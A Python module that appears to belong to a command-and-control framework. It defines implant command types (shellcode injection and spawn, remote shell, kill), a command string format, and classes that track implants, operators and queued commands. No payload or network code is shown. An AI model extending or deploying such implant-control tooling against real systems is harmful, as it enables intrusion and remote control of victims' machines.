from typing import List, Dict
from enum import Enum
from datetime import datetime
import queue

# All of the commands available for implants
# NOT ALL CLIENT COMMANDS
class CMD_TYPE(Enum):
    CMD_SHELLCODE_INJECT = "CMD_SHELLCODE_INJECT"
    CMD_SHELLCODE_SPAWN = "CMD_SHELLCODE_SPAWN"
    CMD_SHELL = "CMD_SHELL"
    CMD_KILL = "CMD_KILL"

# Types of server updates, to be handled
class SERVER_UPDATE_TYPE(Enum):
    NEW_IMPLANT = "NEW_IMPLANT"
    DELETE_IMPLANT = "DELETE_IMPLANT"
    NEW_COMMAND_RESPONSE = "NEW_COMMAND_RESPONSE"

def create_command_str(id: str, type: CMD_TYPE, params: List[str]) -> str:
    cmd_str = ""
    # ID is always first
    cmd_str += id
    cmd_str += ":::"
    # CMD_TYPE is always next
    cmd_str += type.value
    cmd_str += ":::"

    # Loop through the params and add those as well
    for i in range(len(params)):
        cmd_str += params[i]
        if i is not len(params) - 1:
            cmd_str += ":::"

    return cmd_str

# Only created when an implant connects to the server
# Commands are pushed and popped from the implants command_queue
class Implant:
    def __init__(self, name: str, major_v: str, build_num: str, sleep_time: int):
        self.name = name
        self.command_queue = []
        self.last_checkin = datetime.now()
        self.sleep_time = sleep_time
        self.major_v = major_v
        self.build_num = build_num
        self.connected = True
    def queue_command(self, cmd_str: str):
        self.command_queue.append(cmd_str)
    def pop_command(self) -> str:
        try: 
            return self.command_queue.pop(0)
        # TODO: Make a server error handler that would handle a raised
        # error via dict lookup
        except:
            return "0"
class client_db:
    def __init__(self, server: str, port: str, operator_name: str, imp_db: Dict[str, Implant]):
        self.server = server
        self.port = port
        self.operator_name = operator_name
        self.selected_implant = ""
        self.new_server_update = False
        self.server_updates = queue.Queue() 

        # Use the shared class that is defined for both the server and client
        # The functions within wont be used, just to sync the storage between
        # the client and server easily
        self.implant_db = imp_db

# operator and operator_database used by server to track operators
class Operator:
    def __init__(self, name: str, IP: str, port: str):
        self.name = name
        self.IP = IP
        self.port = port
        self.connected = True
class OperatorDatabase:
    def __init__(self):
        self.dict = {}
    def add_operator(self, name: str, operator: Operator):
        self.dict[name] = operator
    def delete_operator(self, name: str):
        del self.dict[name]
    def is_unique(self, name):
        if name in list(self.dict.keys()):
            return False
        return True

# implant_db as below is only used by the server
# the client just uses a dict of implant objects defined above
class ImplantDatabase:
    def __init__(self):
        self.dict = {}
    def add_implant(self, new_implant: Implant):
        self.dict[new_implant.name] = new_implant
